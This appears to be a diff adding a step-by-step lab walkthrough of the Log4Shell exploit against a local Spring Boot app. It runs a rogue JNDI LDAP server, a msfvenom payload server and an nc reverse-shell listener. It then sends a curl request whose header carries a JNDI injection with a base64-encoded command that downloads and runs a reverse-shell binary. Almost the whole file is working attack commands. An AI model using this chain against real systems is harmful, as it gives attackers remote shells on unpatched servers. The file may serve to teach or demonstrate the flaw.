@@ -1,0 +1,27 @@
+# In terminal 1 - we run the vulnerable Spring Boot app with Log4j that gets compromised when using logger.info() to log a header
+#   logger.info("Received a request for API version " + apiVersion);
+# terminal 1 - this runs the vulnerable java Spring Boot App with compromised log4j
+$ docker run --rm -it --network=host --name spring-boot-log4j-vulnerable spring-boot-log4j-vulnerable
+
+# In terminal 2 - this runs the rogue LDAP server that sends the rogue LDAP response that enables a reverse shell into the victim's host computer
+# In this case it sends back the LDAP response with redirection to ExploitigO4YubMcK.class and the victim retrieves that class from HTTP server on 8888.
+$ java -jar tools/JNDIExploit-1.2-SNAPSHOT.jar -i 127.0.0.1 -p 8888
+
+# In terminal 3 - this runs the rogue http server hosting the dialback executable rev.elf that is downloaded by the vulnerable app executing the ExploitigO4YubMcK.class
+$ docker run -it --rm --network=host msfvenom
+
+# Invisible to the observer, the victim would receive the LDAP response with redirection to the ExploitigO4YubMcK.class, fetches the class and executes it. What we see in Terminal 3 is the log of the victim accessing the http server and returning the rogue executable
+
+# In terminal 4 - ncat that listens and gets shell access to the victim's host
+$ sudo nc -lvnp 4444
+
+# now we see an invisible shell prompt but that has access to the victim's host
+# lets try to run a command
+ls -l
+
+# In terminal 5 - we will send an attack curl command that sends a JNDI command that directs JNDI to connect to the rogue ldap server at ldap://127.0.0.1:1389
+# The hex string in JNDI string is a base64 encoding of:
+# wget http://127.0.0.1:8081/rev.elf -O /tmp/rev.elf && chmod +x /tmp/rev.elf && /tmp/rev.elf
+# So the malicious LDAP server responds with a Java class that executes that command. The victim executes that and fetches the rev.elf from the server in Terminal 3 and executes it. That connects to nc in terminal 4.
+# now let's initiate the attack and then switch to terminal 4.
+$ curl 127.0.0.2:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMTI3LjAuMC4xOjgwODEvcmV2LmVsZiAtTyAvdG1wL3Jldi5lbGYgJiYgY2htb2QgK3ggL3RtcC9yZXYuZWxmICYmIC90bXAvcmV2LmVsZgo=}'
